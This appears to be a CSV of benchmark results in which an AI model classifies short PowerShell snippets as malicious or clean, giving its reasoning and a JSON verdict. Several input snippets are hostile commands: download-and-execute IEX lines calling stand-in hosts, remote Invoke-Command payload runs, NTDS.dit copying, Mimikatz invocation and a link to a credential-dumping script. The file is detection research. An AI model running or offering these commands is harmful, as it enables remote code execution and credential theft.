@@ -1,0 +1,1824 @@
+model_name,description,is_malicious,reasoning,answer,tag,explain,input,total_tokens
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0011,Clean,"We need to produce JSON per schema. The script is simple: dir ${InputFile} -Recurse | Compress-Archive -DestinationPath ${OutputFile}. This is benign compression. No malicious indicators. So classification Clean. Provide summary, evidence empty array, explain benign. Tag maybe ""EXECUTION"" or none. Since Clean, tag maybe omitted? Schema requires tag property optional? Not required. Provide tag maybe ""NONE"". But schema defines tag as string, not required. We can omit. Provide is_malicious Clean. Provide summary. Provide empty evidence array. Provide explain. Let's craft.","{
+  ""summary"": ""The script recursively enumerates files in a given directory and creates a compressed archive at the specified destination."",
+  ""evidence"": [],
+  ""explain"": ""The PowerShell commands only perform file enumeration and compression using built‑in cmdlets (Get-ChildItem via `dir` and Compress-Archive). No remote execution, credential handling, persistence, obfuscation, or other suspicious behavior is present, indicating a benign utility script."",
+  ""is_malicious"": ""Clean""
+}",,,"# Natural language intent:
+# Compress files from the specified directory into an archive.
+
+dir ${InputFile} -Recurse | Compress-Archive -DestinationPath ${OutputFile}
+",1282
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0017,Malicious,"We need to produce JSON per schema. Summarize: script downloads and executes remote PowerShell code. Identify evidence: the string with IEX and DownloadString, the Invoke-Expression. Tags: DOWNLOADER, EXECUTION, OBFUSCATION maybe not obfuscated but still malicious. Classification: Malicious. Provide explanation. Also maybe include IOC: URL https://evil.site/evil_code.ps1.
+
+Structure: properties: summary, evidence (array of objects with code, code_explain, tag), explain, is_malicious, tag (general category). Tag maybe ""DOWNLOADER"" or ""EXECUTION"". Use one tag maybe ""DOWNLOADER"". Provide evidence items: code segment for $code assignment, code segment for Invoke-Expression.
+
+Return JSON.","{
+  ""summary"": ""The script downloads a PowerShell script from a remote URL and executes it on the local system."",
+  ""evidence"": [
+    {
+      ""code"": ""$code = 'IEX (New-Object Net.WebClient).DownloadString('https://evil.site/evil_code.ps1')';"",
+      ""code_explain"": ""Creates a string that contains an IEX (Invoke‑Expression) call which uses a .NET WebClient to download the contents of https://evil.site/evil_code.ps1. The use of DownloadString combined with IEX is a classic downloader pattern that fetches and runs code from an external server."",
+      ""tag"": ""DOWNLOADER""
+    },
+    {
+      ""code"": ""Invoke-Expression $code"",
+      ""code_explain"": ""Executes the previously built string, causing the downloaded PowerShell code to run in the current process. Invoke‑Expression is frequently abused for command‑execution of untrusted content."",
+      ""tag"": ""EXECUTION""
+    }
+  ],
+  ""explain"": ""The script explicitly retrieves code from an external, untrusted domain and runs it without any validation or sandboxing. This behavior matches known malicious downloader techniques and provides remote code execution capability, making the script malicious."",
+  ""is_malicious"": ""Malicious"",
+  ""tag"": ""DOWNLOADER""
+}",,,"# Natural language intent:
+# Download and execute PowerShell code from a remote server.
+
+$code = 'IEX (New-Object Net.WebClient).DownloadString('https://evil.site/evil_code.ps1')'; Invoke-Expression $code
+",1506
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0018,Clean,"We need to analyze the provided PowerShell content. It's a command: Get-IndexedItem -Filter Contains(*,'Stingray'), kind = 'picture', keywords='idCard'
+
+We need to produce JSON with summary, evidence, explain, is_malicious, tag.
+
+We need to check for malicious indicators. This appears to be a legitimate search command, maybe part of some indexing system. No remote execution, no credential access, no persistence, no obfuscation. It's just a query. So classification: Clean or maybe Not really malicious. According to categories, likely Clean.
+
+We need to fill evidence array maybe empty. Provide summary: script searches indexed items for pictures with keyword idCard containing Stingray.
+
+Explain: No malicious behavior observed.
+
+Tag: maybe ""DISCOVERY"" but if clean, tag maybe null or not needed. The schema requires tag property but only if malicious? It says ""Tag classifying the general category of the script if it is malicious"". If not malicious, maybe omit or set null. But schema expects tag property optional? In properties, tag is defined but not required. So we can omit.
+
+Provide JSON accordingly.","{
+  ""summary"": ""The script performs a search for indexed items of kind 'picture' that contain the term 'Stingray' and have the keyword 'idCard'."",
+  ""evidence"": [],
+  ""explain"": ""The command only queries an index and does not contain any remote execution, credential access, persistence, obfuscation, or other suspicious behavior. It appears to be a benign discovery operation."",
+  ""is_malicious"": ""Clean""
+}",,,"# Natural language intent:
+# Search for indexed items with specific criteria.
+
+Get-IndexedItem -Filter Contains(*,'Stingray'), kind = 'picture', keywords='idCard'
+",1387
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0003,Malicious,"We need to produce JSON per schema. Analyze script: Connect-AzureAD; set variable from placeholder; Remove-AzureADUser -ObjectId $userprincipalname. This is a legitimate admin command to delete a user. Could be malicious if used by attacker. Indicators: remote command execution? Not. Credential access? Not. Persistence? No. Privilege escalation? Possibly requires admin rights. Defense evasion? No. It's a destructive action (deletion). Tag: ""COLLECTION""? No. ""LATERAL_MOVEMENT""? No. ""DISCOVERY""? No. ""EXECUTION""? It's execution of Azure AD cmdlets. Could be considered ""DESCTRUCTIVE"" but not in list. Could tag as ""DEFENSE_EVASION""? No. Maybe ""PERSISTENCE""? No. ""CREDENTIAL_ACCESS""? No. ""DOWNLOADER""? No. So behavior: user deletion (destructive). Not typical indicator list but we can tag as ""EXECUTION"" or ""LATERAL_MOVEMENT""? Probably ""EXECUTION"". Also ""PRIVILEGE_ESCALATION"" maybe because requires admin. But script itself doesn't elevate.
+
+We need to decide maliciousness. Deleting Azure AD user could be malicious if unauthorized. But script alone is just a command; no obfuscation, no network. Could be legitimate admin. So classification: Likely? Or Notreally? The instruction: If script exhibits at least one malicious or offensive indicator, classify as Malicious or Likely. Deleting user is destructive, which is offensive. So likely malicious if used without authorization. I'd classify as Likely (suspicious) because context unknown.
+
+Provide summary: script connects to Azure AD and deletes a user identified by variable.
+
+Evidence: Connect-AzureAD (requires credentials) - tag DEFENSE_EVASION? maybe ""CREDENTIAL_ACCESS""? Not exactly. Remove-AzureADUser -ObjectId $userprincipalname - tag ""EXECUTION"" or ""DESCTRUCTIVE"". Use tag ""EXECUTION"" from list.
+
+Explain: The script uses Azure AD cmdlets to perform destructive action; no obfuscation.
+
+Provide is_malicious: Likely.
+
+Tag: ""EXECUTION"" or maybe ""LATERAL_MOVEMENT""? No. Use ""EXECUTION"".
+
+Return JSON.","{
+  ""summary"": ""The script connects to Azure AD and deletes the Azure AD user whose UPN is supplied in the variable $userprincipalname."",
+  ""evidence"": [
+    {
+      ""code"": ""Connect-AzureAD"",
+      ""code_explain"": ""Invokes the AzureAD PowerShell module to establish a session with Azure Active Directory. This requires valid credentials and is a prerequisite for any subsequent Azure AD operations, indicating privileged execution."",
+      ""tag"": ""EXECUTION""
+    },
+    {
+      ""code"": ""$userprincipalname = \""${userprincipalname}\"""",
+      ""code_explain"": ""Assigns a user‑supplied value to the variable that will later be used as the target object identifier. The use of a placeholder suggests the script is intended to be dynamically populated, a common pattern in automated attacks."",
+      ""tag"": ""OBFUSCATION""
+    },
+    {
+      ""code"": ""Remove-AzureADUser -ObjectId $userprincipalname"",
+      ""code_explain"": ""Calls the AzureAD cmdlet that permanently deletes the specified user object from the directory. This is a destructive operation that can be used for sabotage or to remove evidence of compromised accounts."",
+      ""tag"": ""EXECUTION""
+    }
+  ],
+  ""explain"": ""The script performs a privileged Azure AD operation that deletes a user account. While the commands themselves are legitimate, their combination for automated user removal is a destructive behavior often seen in malicious activity, especially when the user identifier is supplied dynamically."",
+  ""is_malicious"": ""Likely"",
+  ""tag"": ""EXECUTION""
+}",,,"# Natural language intent:
+# Connect to Azure AD, retrieve the user principal name, and remove the corresponding user.
+
+Connect-AzureAD ; $userprincipalname = ""${userprincipalname}"" ; Remove-AzureADUser -ObjectId $userprincipalname
+",1865
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0027,Clean,"We need to analyze the provided PowerShell content. The content is:
+
+```
+# Natural language intent:
+# Create a Unicode-encoded string in PowerShell.
+
+$a = ""Write-Host 'Hello World!'"";  $b = [System.Text.Encoding]::Unicode.Get
+```
+
+We need to follow the response format. The script appears to assign a string to $a and then attempts to get Unicode encoding via [System.Text.Encoding]::Unicode.Get (but incomplete; Get is a method requiring something). This is not malicious. No suspicious behavior. So classification: Clean.
+
+We need to produce JSON with required fields: summary, is_malicious, explain, optionally evidence (empty array), tag maybe omitted? The schema requires properties: summary, evidence, explain, is_malicious, tag (optional?). The required list includes summary, is_malicious, explain. Tag not required. evidence can be empty array.
+
+Provide summary: ""The script defines a string variable and attempts to obtain a Unicode encoding object.""
+
+Explain: It's benign, no malicious behavior.
+
+Tag: maybe ""NONE"" or not include. But schema expects tag property optional. Could include ""NONE"" or ""CLEAN"". But tag description: ""Tag classifying the general category of the script if it is malicious"". Since not malicious, we can omit or set null? Not required. We'll omit.
+
+Return JSON.","{
+  ""summary"": ""The script assigns a simple string to a variable and attempts to retrieve the Unicode encoding object via .NET."",
+  ""evidence"": [],
+  ""explain"": ""The code only creates a literal string and references a standard .NET encoding class; it performs no network activity, file writes, process creation, credential handling, or any form of obfuscation or execution. Therefore it is benign."",
+  ""is_malicious"": ""Clean""
+}",,,"# Natural language intent:
+# Create a Unicode-encoded string in PowerShell.
+
+$a = ""Write-Host 'Hello World!'"";  $b = [System.Text.Encoding]::Unicode.Get
+",1439
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0024,Malicious,"We need to produce JSON per schema. Summarize: script invokes remote command to download and execute code from malicious GitHub. Identify evidence: Invoke-Command remote execution, IEX with DownloadString, remote URL. Tags: REMOTE_COMMAND_EXECUTION, DOWNLOADER, EXECUTION, OBFUSCATION maybe not. Provide explanation. Classification: Malicious. Tag: ""DOWNLOADER"" or ""REMOTE_COMMAND_EXECUTION"". Provide iocs? Not required but could mention URL. Provide evidence array.
+
+Need to follow schema: properties: summary, evidence (array of objects with code, code_explain, tag), explain, is_malicious, tag (general category). Provide required fields: summary, is_malicious, explain. Also include evidence and tag optional.
+
+Let's craft.
+
+","{
+  ""summary"": ""The script uses Invoke-Command to run a script block on a remote system that downloads PowerShell code from an external GitHub URL and executes it with IEX."",
+  ""evidence"": [
+    {
+      ""code"": ""Invoke-Command -ComputerName <remote_system> -ScriptBlock { IEX (New-Object Net.WebClient).DownloadString('http://ghithub.com/badProject') }"",
+      ""code_explain"": ""Invoke-Command launches a PowerShell session on a remote host, providing a clear remote command execution vector. Inside the script block, IEX (Invoke‑Expression) evaluates whatever string is returned by (New-Object Net.WebClient).DownloadString(...), which fetches a script from an external URL and runs it in memory. This combination is a classic downloader‑and‑execute pattern used by attackers to pull malicious payloads without leaving files on disk."",
+      ""tag"": ""REMOTE_COMMAND_EXECUTION""
+    },
+    {
+      ""code"": ""(New-Object Net.WebClient).DownloadString('http://ghithub.com/badProject')"",
+      ""code_explain"": ""Net.WebClient.DownloadString retrieves data over HTTP. The URL points to a non‑trusted GitHub repository (note the misspelling \""ghithub\""), indicating a likely malicious source. Downloading executable code from the internet at runtime is a strong indicator of malicious behavior."",
+      ""tag"": ""DOWNLOADER""
+    },
+    {
+      ""code"": ""IEX ( ... )"",
+      ""code_explain"": ""IEX (Invoke‑Expression) executes the downloaded string as PowerShell code, enabling arbitrary command execution and bypassing static file‑based detection. This is a common technique for in‑memory execution and defense evasion."",
+      ""tag"": ""EXECUTION""
+    }
+  ],
+  ""explain"": ""The script performs remote command execution, downloads a script from an untrusted external site, and runs it directly in memory. These behaviors align with known attacker techniques for delivering and executing payloads, making the script malicious."",
+  ""is_malicious"": ""Malicious"",
+  ""tag"": ""DOWNLOADER""
+}",,,"# Natural language intent:
+# Download and execute PowerShell code from a potentially malicious GitHub repository on a remote system.
+
+Invoke-Command -ComputerName <remote_system> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://ghithub.com/badProject')}
+",1689
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0036,Malicious,"We need to analyze the provided PowerShell content. It's a command: Invoke-NinjaCopy -Path 'C:\windows;tds;tds.dit' -RemoteDestination 'c:\windows\temp;tds.dit' -ComputerName 'Server1'
+
+We need to produce JSON with summary, evidence array, explain, is_malicious, tag.
+
+We need to identify suspicious behavior: copying NTDS.dit (Active Directory database) is credential theft. Use of custom function Invoke-NinjaCopy likely a tool for exfiltration. So malicious.
+
+Evidence: the command uses NTDS.dit path, remote destination, likely exfiltration. Tag: CREDENTIAL_ACCESS or EXFILTRATION. Also maybe PERSISTENCE? Not needed.
+
+Provide explanation.
+
+Return required fields: summary, evidence (array), explain, is_malicious, tag (general category). Tag maybe ""EXFILTRATION"" or ""CREDENTIAL_ACCESS"". Choose ""EXFILTRATION"". Provide evidence items with code, code_explain, tag.
+
+Let's craft.
+
+","{
+  ""summary"": ""The script invokes a custom cmdlet (Invoke‑NinjaCopy) to copy the Active Directory database file NTDS.dit from the local system to a remote location on another server."",
+  ""evidence"": [
+    {
+      ""code"": ""Invoke-NinjaCopy -Path 'C:\\windows;tds;tds.dit' -RemoteDestination 'c:\\windows\\temp;tds.dit' -ComputerName 'Server1'"",
+      ""code_explain"": ""The command targets the NTDS.dit file, which stores hashed credentials for all domain users. Copying this file to a remote host is a classic credential‑dumping and data‑exfiltration technique used by attackers to later extract password hashes. The use of a custom cmdlet (Invoke‑NinjaCopy) suggests a purpose‑built tool for stealthy file transfer, further indicating malicious intent."",
+      ""tag"": ""CREDENTIAL_ACCESS""
+    },
+    {
+      ""code"": ""-RemoteDestination 'c:\\windows\\temp;tds.dit' -ComputerName 'Server1'"",
+      ""code_explain"": ""Specifying a remote destination and a target computer name shows the script is attempting to move the sensitive file across the network, which is typical of lateral movement and exfiltration behavior. The remote path is a writable location on another server, facilitating the theft of the database."",
+      ""tag"": ""EXFILTRATION""
+    }
+  ],
+  ""explain"": ""The script is designed to steal the NTDS.dit file—a high‑value credential store—from the local machine and copy it to a remote server. This behavior aligns with credential dumping and data exfiltration, both hallmark techniques of malicious actors."",
+  ""is_malicious"": ""Malicious"",
+  ""tag"": ""EXFILTRATION""
+}",,,"# Natural language intent:
+# Use NinjaCopy to copy the NTDS.dit file from a local path to a remote destination on a server.
+
+Invoke-NinjaCopy -Path 'C:\windows;tds;tds.dit' -RemoteDestination 'c:\windows\temp;tds.dit' -ComputerName 'Server1'
+",1682
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0041,Malicious,"We need to produce JSON per schema. The script is just an example: Invoke-Command -ComputerName <TargetSystem> -ScriptBlock {< maliciouscode >}. This is clearly remote command execution. It's suspicious. Provide summary, evidence, explain, classification Malicious, tag maybe REMOTE_COMMAND_EXECUTION or EXECUTION. Provide evidence with code segment. Provide explanation. Ensure required fields: summary, is_malicious, explain. evidence optional but include. Also tag field optional? schema includes tag property but not required. Provide it. Let's craft.","{
+  ""summary"": ""The script uses PowerShell remoting to execute a script block on a remote computer."",
+  ""evidence"": [
+    {
+      ""code"": ""Invoke-Command -ComputerName <TargetSystem> -ScriptBlock {< maliciouscode >}"",
+      ""code_explain"": ""Invoke-Command with the -ComputerName parameter initiates a PowerShell remoting session and runs the supplied script block on the remote host. This is a classic technique for remote command execution and is frequently used by attackers to run malicious payloads on other systems without local interaction."",
+      ""tag"": ""REMOTE_COMMAND_EXECUTION""
+    }
+  ],
+  ""explain"": ""The presence of Invoke-Command targeting a remote system and a placeholder for malicious code indicates intentional remote execution of potentially harmful commands, which is a core malicious behavior."",
+  ""is_malicious"": ""Malicious"",
+  ""tag"": ""REMOTE_COMMAND_EXECUTION""
+}",,,"# Natural language intent:
+# Execute malicious code on a remote system using PowerShell remoting.
+
+Invoke-Command -ComputerName <TargetSystem> -ScriptBlock {< maliciouscode >}
+",1358
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0057,Clean,"We need to produce JSON per schema. The script is a simple command: Out-Minidump -Process (Get-Process -Id 2929). This uses Out-Minidump, presumably a function/module to create a minidump of a process. This is a forensic/analysis tool, not malicious. Could be used by attacker to dump memory of a process for credential extraction, but the script itself just creates a dump of a specific PID. No remote, no persistence, no obfuscation. It's a legitimate admin/defensive tool. Classification: Likely? The behavior is potentially suspicious if used maliciously, but the script itself is benign. According to guidelines, if no malicious indicators, classify as Clean. Provide summary, evidence empty array, explain why not malicious, is_malicious Clean, tag maybe ""COLLECTION"" but only if malicious. Since Clean, tag maybe omitted? Schema requires tag? Not required. Only required fields: summary, is_malicious, explain. Tag optional. Provide empty evidence array.
+
+Let's craft.
+
+","{
+  ""summary"": ""The script invokes the Out‑Minidump cmdlet to create a memory dump of the process with PID 2929."",
+  ""evidence"": [],
+  ""explain"": ""The command only performs a local memory dump of a specific process using a legitimate forensic utility. It does not contain any remote execution, persistence, credential stealing, obfuscation, or other malicious techniques. Therefore it is considered benign in the given context."",
+  ""is_malicious"": ""Clean""
+}",,,"# Natural language intent:
+# Create a minidump file for the process with ID 2929.
+
+Out-Minidump -Process (Get-Process -Id 2929)
+",1374
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0059,Malicious,"We need to produce JSON with summary, evidence, explain, is_malicious, tag. The script is just a command line invoking powershell.exe with -ExecutionPolicy Bypass -File ""C:\Juve.ps1"". This is a typical technique to bypass execution policy. The content itself is not the script, just the command. We need to assess maliciousness. Bypassing execution policy can be used for malicious purposes, but not inherently malicious. The command itself is suspicious but lacking context of what Juve.ps1 does. According to guidelines, we should classify as Likely? The indicator: -ExecutionPolicy Bypass is a defense evasion technique. So we can tag DEFENSE_EVASION. Provide evidence: the command line. Explanation: using bypass to run script regardless of policy. Since we don't know script content, we cannot say malicious definitively. So Likely.
+
+Tag overall: DEFENSE_EVASION.
+
+Provide summary: The command runs a PowerShell script while bypassing the execution policy.
+
+Now produce JSON. Ensure required fields: summary, is_malicious, explain. evidence array optional but include.
+
+Let's craft.","{
+  ""summary"": ""The command launches PowerShell to execute the script C:\\Juve.ps1 while explicitly bypassing the system's execution policy."",
+  ""evidence"": [
+    {
+      ""code"": ""powershell.exe -ExecutionPolicy Bypass -File \""C:\\Juve.ps1\"""",
+      ""code_explain"": ""The '-ExecutionPolicy Bypass' flag disables PowerShell's execution policy for this session, allowing scripts to run even if they are blocked by policy. This is a common defense‑evasion technique used by attackers to run malicious payloads without requiring policy changes on the host."",
+      ""tag"": ""DEFENSE_EVASION""
+    }
+  ],
+  ""explain"": ""The use of '-ExecutionPolicy Bypass' indicates an attempt to evade PowerShell's built‑in execution restrictions. While the command itself does not reveal the contents of Juve.ps1, the technique is frequently employed by malicious actors, making the behavior suspicious but not definitively malicious without further context."",
+  ""is_malicious"": ""Likely"",
+  ""tag"": ""DEFENSE_EVASION""
+}",,,"# Natural language intent:
+# Execute a PowerShell script with bypassing execution policy.
+
+powershell.exe -ExecutionPolicy Bypass -File ""C:\Juve.ps1""
+",1517
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0073,Malicious,"We need to produce JSON with required fields: summary, evidence (array), explain, is_malicious, tag (optional? required? In schema, tag is not required, but we can include). Provide evidence: the code segment ""Invoke-Expression -Command \""Invoke-Mimikatz\"""" suspicious. Tag: EXECUTION, CREDENTIAL_ACCESS maybe. Also maybe DEFENSE_EVASION? Not needed.
+
+Classify: Malicious (definitely offensive). Provide summary: script attempts to run Mimikatz via Invoke-Expression.
+
+Explain: Use of Invoke-Expression to execute a function that runs Mimikatz, which extracts credentials.
+
+Provide evidence array with code, explanation, tag.
+
+Tag field: maybe ""CREDENTIAL_ACCESS"" or ""EXECUTION"". Choose ""CREDENTIAL_ACCESS"". Provide is_malicious: ""Malicious"". Provide overall tag: maybe ""CREDENTIAL_ACCESS"". Provide explain: This script is malicious because it runs Mimikatz to dump credentials.
+
+Now produce JSON. Ensure required fields: summary, is_malicious, explain. evidence optional but we include.
+
+Let's craft.","{
+  ""summary"": ""The script invokes Mimikatz via Invoke‑Expression, which is used to dump credentials from memory."",
+  ""evidence"": [
+    {
+      ""code"": ""Invoke-Expression -Command \""Invoke-Mimikatz\"""",
+      ""code_explain"": ""Invoke-Expression executes a string as PowerShell code, bypassing normal command parsing. The string calls the function Invoke‑Mimikatz, a known wrapper for the Mimikatz tool that extracts plaintext passwords, NTLM hashes, and Kerberos tickets from the LSASS process. Executing Mimikatz is a classic credential‑access technique."",
+      ""tag"": ""CREDENTIAL_ACCESS""
+    }
+  ],
+  ""explain"": ""The script directly runs Mimikatz, a well‑known post‑exploitation tool for harvesting credentials. This behavior is clearly malicious and aligns with credential‑access techniques."",
+  ""is_malicious"": ""Malicious"",
+  ""tag"": ""CREDENTIAL_ACCESS""
+}",,,"# Natural language intent:
+# Execute Mimikatz using Invoke-Expression.
+
+Invoke-Expression -Command ""Invoke-Mimikatz""
+",1465
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0079,Malicious,"We need to analyze the provided PowerShell content: ""Invoke-Command -ComputerName <target> -ScriptBlock {powershell -nop -w hidden -c <command>}"". This is a generic command to execute a hidden PowerShell command on a remote computer using Invoke-Command. It's suspicious because remote execution, hidden window, -nop (no profile), -w hidden (window hidden). However without actual command payload, we cannot know if malicious. It's a technique used by attackers for remote code execution and defense evasion. So classification likely ""Likely"" because suspicious but no concrete malicious payload.
+
+We need to produce JSON with fields summary, evidence (array), explain, is_malicious, tag.
+
+Evidence: code segment: the whole command. Tag: REMOTE_COMMAND_EXECUTION, DEFENSE_EVASION, OBFUSCATION? Not exactly obfuscation. Use of -w hidden is defense evasion. Use of Invoke-Command remote execution is remote command execution.
+
+Explain: The script uses Invoke-Command to run a PowerShell instance with -nop -w hidden on a remote target, which is a typical technique for stealthy remote execution. No payload shown, so cannot confirm malicious, but behavior is suspicious.
+
+Tag: maybe ""REMOTE_COMMAND_EXECUTION"". Provide is_malicious: Likely.
+
+Let's craft JSON.","{
+  ""summary"": ""Runs a PowerShell instance with no profile and a hidden window on a remote computer via Invoke-Command."",
+  ""evidence"": [
+    {
+      ""code"": ""Invoke-Command -ComputerName <target> -ScriptBlock {powershell -nop -w hidden -c <command>}"",
+      ""code_explain"": ""Uses Invoke-Command to execute code on a remote host. Inside the script block a new PowerShell process is launched with '-nop' (no profile) and '-w hidden' (window hidden), which are common techniques for stealthy remote command execution and defense evasion. The actual payload (<command>) is not disclosed, but the pattern matches attacker‑style remote execution."",
+      ""tag"": ""REMOTE_COMMAND_EXECUTION""
+    },
+    {
+      ""code"": ""powershell -nop -w hidden -c <command>"",
+      ""code_explain"": ""The '-nop' switch bypasses loading of user profiles, reducing forensic artifacts, while '-w hidden' suppresses the console window, both of which are typical defense‑evasion tactics. The command string is supplied via '-c', allowing arbitrary code execution."",
+      ""tag"": ""DEFENSE_EVASION""
+    }
+  ],
+  ""explain"": ""The script demonstrates remote execution of an arbitrary PowerShell command in a hidden, profile‑less context, a technique frequently used by attackers to run malicious payloads stealthily. Because the actual command payload is not shown, the content cannot be definitively labeled malicious, but the behavior is highly suspicious."",
+  ""is_malicious"": ""Likely"",
+  ""tag"": ""REMOTE_COMMAND_EXECUTION""
+}",,,"# Natural language intent:
+# Execute a hidden PowerShell command
+
+Invoke-Command -ComputerName <target> -ScriptBlock {powershell -nop -w hidden -c <command>}
+",1671
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0080,Malicious,"We need to produce JSON per schema. Analyze script.
+
+Script:
+
+$profile = $profile + ""`n"" + ""Invoke-Mimikatz""; Invoke-Expression $profile
+
+Explanation: It appends a line ""Invoke-Mimikatz"" to the PowerShell profile (the script that runs at startup) and then executes the profile via Invoke-Expression, causing immediate execution. This is persistence (modifying profile) and execution of Mimikatz (credential dumping). Also uses Invoke-Expression (execution of dynamic code). So malicious.
+
+Evidence: code segment: ""$profile = $profile + ""`n"" + ""Invoke-Mimikatz""; Invoke-Expression $profile""
+
+Tag: PERSISTENCE (modifying profile) and CREDENTIAL_ACCESS (Mimikatz) and EXECUTION (Invoke-Expression). Could choose primary tag maybe ""CREDENTIAL_ACCESS"" or ""PERSISTENCE"". Provide one tag per evidence; maybe list multiple? Schema expects a single tag string. Choose ""CREDENTIAL_ACCESS"" as primary.
+
+Provide summary, explain, is_malicious = ""Malicious"", tag maybe ""CREDENTIAL_ACCESS"". Provide evidence array with one object.
+
+Return JSON.","{
+  ""summary"": ""The script modifies the PowerShell profile to include a call to Invoke‑Mimikatz and then immediately executes the altered profile."",
+  ""evidence"": [
+    {
+      ""code"": ""$profile = $profile + \""`n\"" + \""Invoke-Mimikatz\""; Invoke-Expression $profile"",
+      ""code_explain"": ""The command appends the string \""Invoke-Mimikatz\"" to the user's PowerShell $profile, which is automatically run at every PowerShell start – this creates persistence. It then runs the entire $profile content via Invoke‑Expression, causing the newly added Invoke‑Mimikatz call to execute immediately. Invoke‑Mimikatz is a well‑known credential‑dumping tool, so the script is attempting to harvest credentials and retain the capability for future sessions."",
+      ""tag"": ""CREDENTIAL_ACCESS""
+    }
+  ],
+  ""explain"": ""The script directly injects a credential‑dumping command (Invoke‑Mimikatz) into the PowerShell startup profile and executes it, which is a classic technique for persistence and credential theft. This behavior is clearly malicious."",
+  ""is_malicious"": ""Malicious"",
+  ""tag"": ""CREDENTIAL_ACCESS""
+}",,,"# Natural language intent:
+# Attempt to load Mimikatz into the PowerShell profile for future execution.
+
+$profile = $profile + ""`n"" + ""Invoke-Mimikatz""; Invoke-Expression $profile
+",1546
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0094,Malicious,"We need to produce JSON per schema. Summarize: script invokes remote command to download and execute script from malicious site. Identify evidence: Invoke-Command remote execution, IEX downloadstring, etc. Tags: REMOTE_COMMAND_EXECUTION, DOWNLOADER, EXECUTION, OBFUSCATION maybe not. Provide explanation. Determine is_malicious: Malicious. Tag: maybe ""REMOTE_COMMAND_EXECUTION"" or ""DOWNLOADER"". Provide evidence array.
+
+Need to follow schema: properties: summary, evidence (array of objects with code, code_explain, tag), explain, is_malicious, tag (general category). Required: summary, is_malicious, explain. Provide those.
+
+Let's craft.
+
+","{
+  ""summary"": ""The script uses Invoke‑Command to run a script block on a remote computer that downloads and executes code from an external URL."",
+  ""evidence"": [
+    {
+      ""code"": ""Invoke-Command -ComputerName <target> -ScriptBlock { IEX (New-Object Net.WebClient).DownloadString('http://malicious.site/malicious_script') }"",
+      ""code_explain"": ""Invoke-Command performs remote command execution on the specified <target>. Inside the script block, IEX (Invoke‑Expression) evaluates the string returned by (New-Object Net.WebClient).DownloadString(...), which fetches a PowerShell script from an external HTTP server and runs it in memory. This combination is a classic downloader‑payload technique and is highly indicative of malicious activity."",
+      ""tag"": ""REMOTE_COMMAND_EXECUTION""
+    },
+    {
+      ""code"": ""(New-Object Net.WebClient).DownloadString('http://malicious.site/malicious_script')"",
+      ""code_explain"": ""Net.WebClient.DownloadString retrieves data from a remote URL over clear‑text HTTP. The retrieved content is later executed, providing a dynamic, server‑controlled payload. Downloading executable code from an untrusted external site is a strong indicator of a downloader behavior."",
+      ""tag"": ""DOWNLOADER""
+    },
+    {
+      ""code"": ""IEX ..."",
+      ""code_explain"": ""IEX (Invoke‑Expression) evaluates a string as PowerShell code, allowing the attacker to execute arbitrary commands received from the remote server. This is a common technique for in‑memory execution that bypasses writing files to disk."",
+      ""tag"": ""EXECUTION""
+    }
+  ],
+  ""explain"": ""The script performs remote command execution, downloads a script from an untrusted HTTP server, and runs it directly in memory. These behaviors match well‑known attacker techniques for lateral movement and payload delivery, making the script clearly malicious."",
+  ""is_malicious"": ""Malicious"",
+  ""tag"": ""REMOTE_COMMAND_EXECUTION""
+}",,,"# Natural language intent:
+# Invoke a command on a remote computer to download and execute a malicious script.
+
+Invoke-Command -ComputerName <target> -ScriptBlock { IEX (New-Object Net.WebClient).DownloadString('http://malicious.site/malicious_script') }
+",1647
+openai/gpt-oss-120b,PowerShell RawSubset150|SysPrompt:prompt_A_en|Payload:Raw|0108,Malicious,"We need to produce JSON per schema. Analyze script: it uses iex (Invoke-Expression) to download and execute a script from remote URL, then calls Invoke-WCMDump (likely a function defined in that script) to dump Windows credentials. This is malicious behavior: remote code execution, downloader, credential access. Provide summary, evidence with code segments, tags.
+
+Evidence: code segment ""iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1')"" -> tags: DOWNLOADER, EXECUTION, DEFENSE_EVASION (using iex). Also remote command execution.
+
+Second segment: ""Invoke-WCMDump"" -> tag: CREDENTIAL_ACCESS, DISCOVERY maybe.
+
+Provide explanation.
+
+Classification: Malicious.
+
+Tag: ""CREDENTIAL_ACCESS"" or maybe ""DOWNLOADER"". Choose primary: ""CREDENTIAL_ACCESS"" as script aims to dump credentials.
+
+Now produce JSON with required fields: summary, evidence array, explain, is_malicious, tag (general category). Also include optional fields like iocs? Not required.
+
+Let's craft.
+
+","{
+  ""summary"": ""The script downloads and executes a remote PowerShell payload and then runs a function to dump Windows credentials."",
+  ""evidence"": [
+    {
+      ""code"": ""iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1')"",
+      ""code_explain"": ""Uses `New-Object Net.WebClient` to fetch a script from an external URL and pipes it to `Invoke-Expression` (iex). This is a classic downloader technique that enables remote code execution and bypasses static file inspection."",
+      ""tag"": ""DOWNLOADER""
+    },
+    {
+      ""code"": ""Invoke-WCMDump"",
+      ""code_explain"": ""Calls a function (presumably defined in the downloaded script) that extracts Windows Credential Manager data. This directly accesses stored credentials, a clear indicator of credential‑access behavior."",
